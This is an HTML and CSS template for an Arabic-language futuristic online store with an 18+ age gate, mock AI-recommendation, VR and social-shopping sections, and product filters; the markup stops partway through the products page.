<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>متجر الخصوصية المتطور - تجربة تسوق حديثة</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#6366F1',
                        secondary: '#EC4899',
                        accent: '#8B5CF6',
                        gold: '#F59E0B',
                        emerald: '#10B981',
                        rose: '#F43F5E'
                    },
                    animation: {
                        'float': 'float 3s ease-in-out infinite',
                        'glow': 'glow 2s ease-in-out infinite alternate',
                        'gradient': 'gradient 15s ease infinite',
                        'neon': 'neon 1.5s ease-in-out infinite alternate',
                        'cyber': 'cyber 3s ease-in-out infinite',
                        'scan': 'scan 2s linear infinite'
                    }
                }
            }
        }
    </script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&amp;family=Orbitron:wght@400;700;900&amp;display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Tajawal', Arial, sans-serif;
            font-weight: 700;
            overflow-x: hidden;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        
        .dark body {
            background: linear-gradient(135deg, #0F0F23 0%, #1A1A2E 100%);
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-20px); }
        }

        @keyframes glow {
            from { box-shadow: 0 0 20px rgba(99, 102, 241, 0.5); }
            to { box-shadow: 0 0 30px rgba(99, 102, 241, 0.8), 0 0 40px rgba(99, 102, 241, 0.3); }
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        @keyframes neon {
            from { text-shadow: 0 0 5px rgba(255,255,255,0.3); }
            to { text-shadow: 0 0 10px rgba(255,255,255,0.5); }
        }

        @keyframes cyber {
            0%, 100% { transform: perspective(400px) rotateY(0deg); }
            50% { transform: perspective(400px) rotateY(2deg); }
        }

        @keyframes scan {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100vw); }
        }

        /* Particles Background */
        #particles-js {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: -1;
        }

        /* Enhanced Glass Effect */
        .glass-effect {
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 25px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            position: relative;
            overflow: hidden;
        }
        
        .dark .glass-effect {
            background: rgba(55, 65, 81, 0.3);
            border: 2px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
        }

        /* Product Grid */
        .product-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 2rem;
        }

        @media (max-width: 768px) {
            .product-grid {
                grid-template-columns: 1fr;
                gap: 1.5rem;
            }
        }

        /* Product Cards */
        .product-card {
            background: linear-gradient(145deg, #ffffff, #f8fafc);
            border-radius: 25px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            transition: all 0.4s ease;
            position: relative;
        }

        .product-card:hover {
            transform: translateY(-10px) scale(1.02);
            box-shadow: 0 30px 60px rgba(0,0,0,0.15);
        }

        .dark .product-card {
            background: linear-gradient(145deg, #374151, #4B5563);
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }

        .product-image-container {
            height: 300px;
            overflow: hidden;
            position: relative;
            background: linear-gradient(45deg, #f3f4f6, #e5e7eb);
        }

        .product-image {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: transform 0.5s ease;
        }

        .product-card:hover .product-image {
            transform: scale(1.1);
        }

        .discount-badge {
            position: absolute;
            top: 15px;
            right: 15px;
            background: linear-gradient(135deg, #EF4444, #DC2626);
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.85rem;
            font-weight: bold;
            animation: glow 2s infinite alternate;
            z-index: 10;
        }

        /* Enhanced Buttons */
        .btn-primary {
            background: linear-gradient(135deg, #D97706, #F59E0B, #FCD34D);
            border: none;
            color: white;
            padding: 12px 24px;
            border-radius: 16px;
            font-weight: 700;
            transition: all 0.4s ease;
            position: relative;
            overflow: hidden;
            box-shadow: 0 6px 20px rgba(217, 119, 6, 0.3);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .btn-primary:hover {
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 12px 35px rgba(217, 119, 6, 0.5);
        }

        .btn-secondary {
            background: linear-gradient(135deg, #10B981, #059669);
            border: none;
            color: white;
            padding: 12px 24px;
            border-radius: 16px;
            font-weight: 700;
            transition: all 0.4s ease;
            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.3);
        }

        .btn-secondary:hover {
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 12px 35px rgba(16, 185, 129, 0.5);
        }

        .btn-cyber {
            background: linear-gradient(45deg, #00ffff, #ff00ff);
            border: none;
            color: black;
            padding: 12px 24px;
            border-radius: 30px;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 2px;
            transition: all 0.3s ease;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
        }

        .btn-cyber:hover {
            transform: scale(1.05);
            box-shadow: 0 0 40px rgba(0, 255, 255, 0.8);
        }

        /* Filter Buttons */
        .filter-btn {
            padding: 12px 24px;
            border-radius: 25px;
            font-weight: 600;
            transition: all 0.3s ease;
            border: 2px solid transparent;
            cursor: pointer;
        }

        .filter-btn:not(.btn-primary) {
            background: rgba(156, 163, 175, 0.3);
            color: #374151;
        }

        .dark .filter-btn:not(.btn-primary) {
            background: rgba(75, 85, 99, 0.3);
            color: #E5E7EB;
        }

        .filter-btn:not(.btn-primary):hover {
            background: linear-gradient(135deg, #D97706, #F59E0B);
            color: white;
            transform: translateY(-2px);
        }

        /* Navigation */
        .nav-link-advanced {
            position: relative;
            transition: all 0.3s ease;
            padding: 12px 20px;
            border-radius: 15px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.9);
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            display: flex;
            align-items: center;
            gap: 8px;
            text-decoration: none;
        }

        .nav-link-advanced:hover {
            color: white;
            background: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
        }

        .action-btn {
            width: 44px;
            height: 44px;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
            cursor: pointer;
        }

        .action-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateY(-2px);
        }

        /* Mobile Navigation */
        .mobile-nav-compact {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            padding: 12px 8px;
            border-radius: 12px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: rgba(255, 255, 255, 0.9);
            text-decoration: none;
            transition: all 0.3s ease;
        }

        .mobile-nav-compact:hover {
            background: rgba(255, 255, 255, 0.2);
            color: white;
            transform: translateY(-2px);
        }

        /* Page transitions */
        .page {
            display: none;
        }

        .page.active {
            display: block;
            animation: fadeIn 0.5s ease-in-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* Live Chat Widget */
        .chat-widget {
            position: fixed;
            bottom: 30px;
            right: 30px;
            z-index: 1000;
            background: linear-gradient(45deg, #667eea, #764ba2);
            border-radius: 50px;
            padding: 15px 25px;
            color: white;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            animation: float 3s ease-in-out infinite;
        }

        .chat-widget:hover {
            transform: scale(1.1);
        }

        /* Dropdown */
        .dropdown-content {
            display: none;
            position: absolute;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            min-width: 200px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            z-index: 1000;
            border-radius: 15px;
            border: 2px solid rgba(255,255,255,0.2);
            transform: translateY(-10px);
            opacity: 0;
            transition: all 0.3s ease;
            top: 100%;
            right: 0;
        }

        .dropdown-content.show {
            display: block;
            transform: translateY(0);
            opacity: 1;
        }

        .dropdown-content a {
            color: #1f2937;
            padding: 15px 20px;
            text-decoration: none;
            display: block;
            transition: all 0.3s ease;
            border-radius: 10px;
            margin: 5px;
            font-weight: 500;
        }

        .dropdown-content a:hover {
            background: linear-gradient(135deg, #6366F1, #EC4899);
            color: white;
            transform: translateX(8px);
        }

        .dark .dropdown-content {
            background: rgba(55, 65, 81, 0.95);
            border-color: rgba(107, 114, 128, 0.3);
        }

        .dark .dropdown-content a {
            color: white;
        }

        /* Notification Badge */
        .notification-badge {
            position: absolute;
            top: -8px;
            right: -8px;
            background: linear-gradient(45deg, #ef4444, #dc2626);
            color: white;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
            font-weight: bold;
            border: 2px solid rgba(255, 255, 255, 0.2);
        }

        .hero-bg {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            position: relative;
        }

        .cyber-text {
            font-family: 'Orbitron', monospace;
            font-weight: 900;
            text-transform: uppercase;
            letter-spacing: 3px;
        }

        .hologram {
            background: linear-gradient(45deg, #ff006e, #8338ec, #3a86ff, #06ffa5, #ffbe0b);
            background-size: 400% 400%;
            animation: gradient 3s ease infinite;
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .neon-text {
            animation: neon 1.5s ease-in-out infinite alternate;
        }

        .ai-panel {
            background: linear-gradient(135deg, rgba(138, 43, 226, 0.8), rgba(30, 144, 255, 0.8));
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 30px;
            margin: 30px 0;
            border: 2px solid rgba(255,255,255,0.2);
            animation: cyber 3s ease-in-out infinite;
        }

        .feature-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 20px;
            padding: 30px;
            transition: all 0.3s ease;
        }

        .feature-card:hover {
            transform: translateY(-10px);
            background: rgba(255, 255, 255, 0.2);
        }

        .vr-preview {
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
            border-radius: 20px;
            padding: 20px;
            text-align: center;
            color: white;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 20px 0;
        }

        .vr-preview:hover {
            transform: rotateX(5deg) rotateY(5deg);
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }

        .social-panel {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 25px;
            margin: 25px 0;
            border: 1px solid rgba(255,255,255,0.2);
        }

        .level-bar {
            background: linear-gradient(90deg, #00ff00, #ffff00, #ff0000);
            height: 10px;
            border-radius: 10px;
            margin: 10px 0;
            animation: glow 2s ease-in-out infinite alternate;
        }

        /* Payment Modal Styles */
        .payment-step {
            display: none;
        }

        .payment-step.active {
            display: block;
        }

        .payment-method {
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 15px;
            padding: 20px;
            margin: 10px 0;
            cursor: pointer;
            transition: all 0.3s ease;
            background: rgba(255, 255, 255, 0.1);
        }

        .payment-method:hover {
            border-color: #6366F1;
            background: rgba(99, 102, 241, 0.1);
        }

        .payment-method.selected {
            border-color: #6366F1;
            background: rgba(99, 102, 241, 0.2);
        }

        .crypto-option {
            display: flex;
            align-items: center;
            padding: 15px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            margin: 10px 0;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .crypto-option:hover {
            border-color: #F59E0B;
            background: rgba(245, 158, 11, 0.1);
        }

        .crypto-option.selected {
            border-color: #F59E0B;
            background: rgba(245, 158, 11, 0.2);
        }
    </style>
</head>
<body class="bg-gradient-to-br from-purple-600 via-pink-600 to-blue-600 text-gray-900 dark:text-white transition-colors duration-300">

    <!-- Particles Background -->
    <div id="particles-js"></div>

    <!-- Live Chat Widget -->
    <div class="chat-widget" onclick="openLiveChat()">
        <i class="fas fa-robot text-xl mr-2"></i>
        <span class="font-bold">دردشة AI</span>
        <div class="absolute -top-2 -right-2 bg-red-500 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold animate-pulse">!</div>
    </div>

    <!-- Age Verification Modal -->
    <div id="age-verification" class="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50">
        <div class="glass-effect p-10 max-w-md w-full mx-4 text-center text-white">
            <i class="fas fa-exclamation-triangle text-5xl text-amber-400 mb-6"></i>
            <h2 class="text-3xl font-bold mb-6">تأكيد العمر</h2>
            <p class="text-gray-200 mb-8 text-lg">
                يجب أن تكون 18 سنة أو أكثر لدخول هذا الموقع
            </p>
            <div class="flex space-x-4 space-x-reverse">
                <button onclick="confirmAge()" class="flex-1 btn-cyber py-4 text-lg">
                    أكبر من 18 سنة
                </button>
                <button onclick="window.location.href='https://google.com'" class="flex-1 bg-gray-600 text-white py-4 rounded-lg hover:bg-gray-700 transition-colors text-lg">
                    أقل من 18 سنة
                </button>
            </div>
        </div>
    </div>

    <!-- Vertical Side Buttons -->
    <div class="fixed right-4 top-1/2 transform -translate-y-1/2 z-40 space-y-4">
        <!-- Currency Selector -->
        <div class="currency-dropdown relative">
            <button onclick="toggleCurrencyDropdown()" class="w-14 h-14 bg-gradient-to-br from-purple-500 to-blue-500 rounded-full text-white shadow-lg hover:shadow-xl transform hover:scale-110 transition-all duration-300 flex items-center justify-center" title="تغيير العملة">
                <span class="text-lg font-bold" id="current-currency">ريال</span>
            </button>
            <div id="currency-dropdown" class="dropdown-content right-16 top-0 min-w-48">
                <a href="#" onclick="changeCurrency('SAR', 'ريال', 1)">🇸🇦 ريال سعودي</a>
                <a href="#" onclick="changeCurrency('USD', '$', 0.27)">🇺🇸 دولار أمريكي</a>
                <a href="#" onclick="changeCurrency('EUR', '€', 0.24)">🇪🇺 يورو</a>
                <a href="#" onclick="changeCurrency('AED', 'درهم', 0.98)">🇦🇪 درهم إماراتي</a>
                <a href="#" onclick="changeCurrency('EGP', 'جنيه', 8.24)">🇪🇬 جنيه مصري</a>
            </div>
        </div>

        <!-- Share Button -->
        <button onclick="showShareModal()" class="w-14 h-14 bg-gradient-to-br from-green-500 to-teal-500 rounded-full text-white shadow-lg hover:shadow-xl transform hover:scale-110 transition-all duration-300 flex items-center justify-center" title="مشاركة الموقع">
            <i class="fas fa-share-alt text-xl"></i>
        </button>

        <!-- Theme Toggle -->
        <button onclick="toggleTheme()" class="w-14 h-14 bg-gradient-to-br from-yellow-500 to-orange-500 rounded-full text-white shadow-lg hover:shadow-xl transform hover:scale-110 transition-all duration-300 flex items-center justify-center" title="تغيير المظهر">
            <i class="fas fa-sun text-xl" id="theme-icon"></i>
        </button>
    </div>

    <!-- Navigation -->
    <nav class="glass-effect sticky top-0 z-40 transition-all duration-300 mx-1 mt-1 rounded-2xl border border-white/10 shadow-xl backdrop-blur-lg">
        <div class="container mx-auto px-3">
            <!-- Header Row -->
            <div class="flex justify-between items-center py-2">
                <!-- Logo Section -->
                <div class="flex items-center space-x-2 space-x-reverse">
                    <div class="relative">
                        <div class="w-8 h-8 bg-gradient-to-r from-purple-500 to-blue-500 rounded-full flex items-center justify-center">
                            <i class="fas fa-atom text-sm text-white"></i>
                        </div>
                        <div class="absolute -top-1 -right-1 w-2 h-2 bg-green-400 rounded-full"></div>
                    </div>
                    <div>
                        <h1 class="text-sm font-black text-white cyber-text">CYBER STORE</h1>
                        <p class="text-xs text-gray-300 hidden sm:block">متجر المستقبل</p>
                    </div>
                </div>

                <!-- Main Navigation - Desktop -->
                <div class="hidden lg:flex items-center space-x-2 space-x-reverse">
                    <a href="#" class="nav-link-advanced" onclick="showPage('home')" data-page="home">
                        <i class="fas fa-home text-lg"></i>
                        <span>الرئيسية</span>
                    </a>
                    <a href="#" class="nav-link-advanced" onclick="showPage('products')" data-page="products">
                        <i class="fas fa-shopping-bag text-lg"></i>
                        <span>المنتجات</span>
                    </a>
                    <a href="#" class="nav-link-advanced" onclick="showPage('ai-recommendations')" data-page="ai-recommendations">
                        <i class="fas fa-robot text-lg"></i>
                        <span>AI التوصيات</span>
                    </a>
                    <a href="#" class="nav-link-advanced" onclick="showPage('vr-experience')" data-page="vr-experience">
                        <i class="fas fa-vr-cardboard text-lg"></i>
                        <span>VR تجربة</span>
                    </a>
                    <a href="#" class="nav-link-advanced" onclick="showPage('social-shopping')" data-page="social-shopping">
                        <i class="fas fa-users text-lg"></i>
                        <span>تسوق اجتماعي</span>
                    </a>
                    <a href="#" class="nav-link-advanced" onclick="showPage('code')" data-page="code">
                        <i class="fas fa-key text-lg"></i>
                        <span>الكود السري</span>
                    </a>
                    <a href="#" class="nav-link-advanced" onclick="showPage('contact')" data-page="contact">
                        <i class="fas fa-phone text-lg"></i>
                        <span>اتصل بنا</span>
                    </a>
                </div>

                <!-- Right Section -->
                <div class="flex items-center space-x-3 space-x-reverse">
                    <!-- Action Buttons -->
                    <div class="flex items-center space-x-3 space-x-reverse">
                        <!-- Voice Search -->
                        <button onclick="startVoiceSearch()" class="action-btn" id="voice-btn" title="البحث الصوتي">
                            <i class="fas fa-microphone"></i>
                        </button>

                        <!-- Search -->
                        <div class="relative hidden md:block">
                            <input type="text" class="w-72 px-4 py-3 text-sm border rounded-xl focus:outline-none focus:border-primary bg-white/10 backdrop-blur border-white/20 text-white placeholder-gray-300" placeholder="🔍 بحث ذكي..." id="smart-search" onkeyup="performSmartSearch(this.value)">
                        </div>

                        <!-- Wishlist -->
                        <button onclick="toggleWishlist()" class="action-btn relative" title="المفضلة">
                            <i class="fas fa-heart" id="wishlist-icon"></i>
                            <span id="wishlist-count" class="notification-badge">0</span>
                        </button>
                        
                        <!-- Cart -->
                        <button onclick="toggleCart()" class="action-btn relative" title="السلة">
                            <i class="fas fa-shopping-cart"></i>
                            <span id="cart-count" class="notification-badge">0</span>
                        </button>

                        <!-- Mobile Menu Toggle -->
                        <button class="lg:hidden action-btn" onclick="toggleMobileMenu()" title="القائمة">
                            <i class="fas fa-bars"></i>
                        </button>
                    </div>
                </div>
            </div>
            
            <!-- Mobile Navigation -->
            <div id="mobile-menu" class="lg:hidden hidden">
                <div class="border-t border-white/10 pt-2 pb-2">
                    <div class="grid grid-cols-4 gap-1 mb-3">
                        <a href="#" class="mobile-nav-compact" onclick="showPage('home')">
                            <i class="fas fa-home text-lg"></i>
                            <span class="text-xs">الرئيسية</span>
                        </a>
                        <a href="#" class="mobile-nav-compact" onclick="showPage('products')">
                            <i class="fas fa-shopping-bag text-lg"></i>
                            <span class="text-xs">المنتجات</span>
                        </a>
                        <a href="#" class="mobile-nav-compact" onclick="showPage('ai-recommendations')">
                            <i class="fas fa-robot text-lg"></i>
                            <span class="text-xs">AI</span>
                        </a>
                        <a href="#" class="mobile-nav-compact" onclick="showPage('vr-experience')">
                            <i class="fas fa-vr-cardboard text-lg"></i>
                            <span class="text-xs">VR</span>
                        </a>
                        <a href="#" class="mobile-nav-compact" onclick="showPage('social-shopping')">
                            <i class="fas fa-users text-lg"></i>
                            <span class="text-xs">اجتماعي</span>
                        </a>
                        <a href="#" class="mobile-nav-compact" onclick="showPage('code')">
                            <i class="fas fa-key text-lg"></i>
                            <span class="text-xs">كود</span>
                        </a>
                        <a href="#" class="mobile-nav-compact" onclick="showPage('contact')">
                            <i class="fas fa-phone text-lg"></i>
                            <span class="text-xs">اتصال</span>
                        </a>
                    </div>
                    <!-- Mobile Search -->
                    <div class="mt-2">
                        <input type="text" class="w-full px-4 py-3 text-base border rounded-xl focus:outline-none focus:border-primary bg-white/10 backdrop-blur border-white/20 text-white placeholder-gray-300" placeholder="🔍 بحث ذكي..." id="mobile-search" onkeyup="performSmartSearch(this.value)">
                    </div>
                </div>
            </div>
        </div>
    </nav>

    <!-- Homepage -->
    <div id="home" class="page active">
        <!-- Hero Section -->
        <section class="hero-bg text-white py-32 relative overflow-hidden">
            <div class="container mx-auto px-4 text-center relative z-10">
                <h1 class="text-5xl md:text-7xl font-black mb-8 cyber-text">
                    <span class="hologram">متجر المستقبل</span>
                </h1>
                <div class="typewriter-effect mb-12">
                    <p class="text-2xl md:text-3xl neon-text" id="typewriter-text">🌸 تجربة تسوق مدعومة بالذكاء الاصطناعي 🌸</p>
                </div>
                
                <!-- AI Smart Recommendations Panel -->
                <div class="ai-panel mb-12">
                    <h3 class="text-3xl font-black mb-6 cyber-text">🤖 التوصيات الذكية</h3>
                    <p class="text-xl mb-4">نحللّ سلوكك وتفضيلاتك لنقدم لك أفضل المنتجات</p>
                    <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mt-8">
                        <div class="bg-white/10 p-6 rounded-xl backdrop-blur-md">
                            <i class="fas fa-brain text-4xl mb-4 text-cyan-400"></i>
                            <h4 class="text-xl font-bold mb-2">تحليل الذكاء الاصطناعي</h4>
                            <p>خوارزميات متطورة تتعلم من اختياراتك</p>
                        </div>
                        <div class="bg-white/10 p-6 rounded-xl backdrop-blur-md">
                            <i class="fas fa-eye text-4xl mb-4 text-green-400"></i>
                            <h4 class="text-xl font-bold mb-2">رؤية كمبيوترية</h4>
                            <p>تحليل الصور والألوان المفضلة لديك</p>
                        </div>
                        <div class="bg-white/10 p-6 rounded-xl backdrop-blur-md">
                            <i class="fas fa-chart-line text-4xl mb-4 text-pink-400"></i>
                            <h4 class="text-xl font-bold mb-2">تنبؤات ذكية</h4>
                            <p>توقع احتياجاتك قبل أن تعرفها</p>
                        </div>
                    </div>
                </div>
                
                <div class="grid grid-cols-1 md:grid-cols-2 gap-8 max-w-5xl mx-auto mb-16">
                    <div class="feature-card text-center">
                        <i class="fas fa-rocket text-5xl mb-6 text-emerald-400 animate-float"></i>
                        <h4 class="text-2xl font-bold mb-4">توصيل بدرونز</h4>
                        <p class="text-lg">خلال 30 دقيقة بالطائرات المسيّرة</p>
                    </div>
                    <div class="feature-card text-center">
                        <i class="fas fa-robot text-5xl mb-6 text-orange-400 animate-float"></i>
                        <h4 class="text-2xl font-bold mb-4">مساعد AI</h4>
                        <p class="text-lg">ذكاء اصطناعي يفهم احتياجاتك</p>
                    </div>
                </div>
                
                <div class="flex flex-col gap-4 justify-center items-center max-w-md mx-auto">
                    <button onclick="showPage('products')" class="w-full btn-cyber px-6 py-4 text-lg font-medium hover:scale-105 transition-transform shadow-lg">
                        <i class="fas fa-shopping-bag mr-2 text-lg"></i>
                        تسوق بالذكاء الاصطناعي
                    </button>
                    <button onclick="showPage('vr-experience')" class="w-full btn-secondary px-6 py-4 text-lg font-medium hover:scale-105 transition-all hover:shadow-lg">
                        <i class="fas fa-vr-cardboard mr-2 text-lg"></i>
                        تجربة الواقع الافتراضي
                    </button>
                </div>
            </div>
        </section>

        <!-- Products Preview -->
        <section class="py-20 bg-gradient-to-br from-gray-50 to-gray-100 dark:from-gray-800 dark:to-gray-900">
            <div class="container mx-auto px-4">
                <h2 class="text-4xl font-black text-center mb-16 bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent">🛍️ المنتجات المميزة</h2>
                <div id="home-products-grid" class="product-grid">
                    <!-- Products will be generated by JavaScript -->
                </div>
                <div class="text-center mt-12">
                    <button onclick="showPage('products')" class="btn-cyber px-8 py-4 text-xl">
                        <i class="fas fa-eye mr-2"></i>
                        عرض جميع المنتجات
                    </button>
                </div>
            </div>
        </section>
    </div>

    <!-- AI Recommendations Page -->
    <div id="ai-recommendations" class="page">
        <section class="py-20 bg-gradient-to-br from-purple-900 via-indigo-900 to-blue-900 min-h-screen">
            <div class="container mx-auto px-4">
                <h1 class="text-5xl font-black text-center mb-12 cyber-text hologram">🤖 توصيات الذكاء الاصطناعي</h1>
                
                <!-- AI Analysis Dashboard -->
                <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12">
                    <div class="ai-panel">
                        <h3 class="text-2xl font-bold mb-4">📊 تحليل سلوكك</h3>
                        <div class="space-y-3">
                            <div class="flex justify-between">
                                <span>منتجات رومانسية</span>
                                <span class="font-bold">85%</span>
                            </div>
                            <div class="level-bar"></div>
                            <div class="flex justify-between">
                                <span>منتجات للأزواج</span>
                                <span class="font-bold">72%</span>
                            </div>
                            <div class="level-bar"></div>
                        </div>
                    </div>
                    <div class="ai-panel">
                        <h3 class="text-2xl font-bold mb-4">🎯 اهتماماتك</h3>
                        <div class="flex flex-wrap gap-2">
                            <span class="bg-white/20 px-3 py-1 rounded-full text-sm">الجودة العالية</span>
                            <span class="bg-white/20 px-3 py-1 rounded-full text-sm">التصميم الأنيق</span>
                            <span class="bg-white/20 px-3 py-1 rounded-full text-sm">الخصوصية</span>
                            <span class="bg-white/20 px-3 py-1 rounded-full text-sm">التوصيل السريع</span>
                        </div>
                    </div>
                    <div class="ai-panel">
                        <h3 class="text-2xl font-bold mb-4">⏰ أوقات التسوق</h3>
                        <p class="text-lg">تتسوق عادة في:</p>
                        <p class="text-2xl font-bold text-green-400">المساء 8-11 PM</p>
                        <p class="text-sm opacity-75">نسبة دقة التنبؤ: 94%</p>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <!-- VR Experience Page -->
    <div id="vr-experience" class="page">
        <section class="py-20 bg-gradient-to-br from-indigo-900 via-purple-900 to-pink-900 min-h-screen">
            <div class="container mx-auto px-4">
                <h1 class="text-5xl font-black text-center mb-12 cyber-text hologram">🥽 تجربة الواقع الافتراضي</h1>
                
                <!-- VR Viewer -->
                <div class="vr-preview mb-12" onclick="startVRExperience()">
                    <i class="fas fa-vr-cardboard text-6xl mb-6"></i>
                    <h2 class="text-3xl font-bold mb-4">ادخل للواقع الافتراضي</h2>
                    <p class="text-xl mb-6">اختبر المنتجات في بيئة ثلاثية الأبعاد</p>
                    <button class="btn-cyber px-8 py-4 text-xl">
                        <i class="fas fa-play mr-2"></i>
                        ابدأ التجربة
                    </button>
                </div>
            </div>
        </section>
    </div>

    <!-- Social Shopping Page -->
    <div id="social-shopping" class="page">
        <section class="py-20 bg-gradient-to-br from-pink-900 via-purple-900 to-indigo-900 min-h-screen">
            <div class="container mx-auto px-4">
                <h1 class="text-5xl font-black text-center mb-12 cyber-text hologram">👥 التسوق الاجتماعي</h1>
                
                <!-- Live Shopping Room -->
                <div class="social-panel mb-12">
                    <div class="flex justify-between items-center mb-6">
                        <h2 class="text-3xl font-bold text-white">🔴 غرف التسوق المباشر</h2>
                        <button class="btn-cyber px-6 py-3" onclick="createShoppingRoom()">
                            <i class="fas fa-plus mr-2"></i>
                            إنشاء غرفة
                        </button>
                    </div>
                    
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div class="bg-white/10 p-6 rounded-xl cursor-pointer hover:transform hover:scale-105 transition-all" onclick="joinShoppingRoom(1)">
                            <div class="flex items-center mb-4">
                                <div class="w-12 h-12 bg-gradient-to-r from-red-500 to-pink-500 rounded-full flex items-center justify-center text-white font-bold">🔴</div>
                                <div class="mr-3">
                                    <h4 class="font-bold text-white">غرفة المنتجات الرومانسية</h4>
                                    <p class="text-gray-300 text-sm">34 متسوق متصل الآن</p>
                                </div>
                            </div>
                            <p class="text-white mb-4">نناقش أفضل المنتجات للأزواج ونشارك التجارب</p>
                            <div class="flex items-center justify-between">
                                <div class="flex items-center space-x-4 space-x-reverse">
                                    <span class="text-green-400"><i class="fas fa-circle mr-1"></i>مباشر</span>
                                    <span class="text-gray-300"><i class="fas fa-users mr-1"></i>34</span>
                                </div>
                                <button class="btn-secondary px-4 py-2">انضم الآن</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>

    <!-- Products Page -->
    <div id="products" class="page">
        <section class="py-20 bg-gradient-to-br from-gray-50 to-gray-100 dark:from-gray-800 dark:to-gray-900 min-h-screen">
            <div class="container mx-auto px-4">
                <h1 class="text-5xl font-black text-center mb-12 cyber-text hologram">🛍️ جميع المنتجات</h1>
                
                <!-- Smart Filters -->
                <div class="flex flex-wrap justify-center mb-8 space-x-4 space-x-reverse">
                    <button onclick="filterProducts('all')" class="filter-btn btn-primary px-8 py-3 rounded-full mb-3 text-lg">🌟 الكل</button>
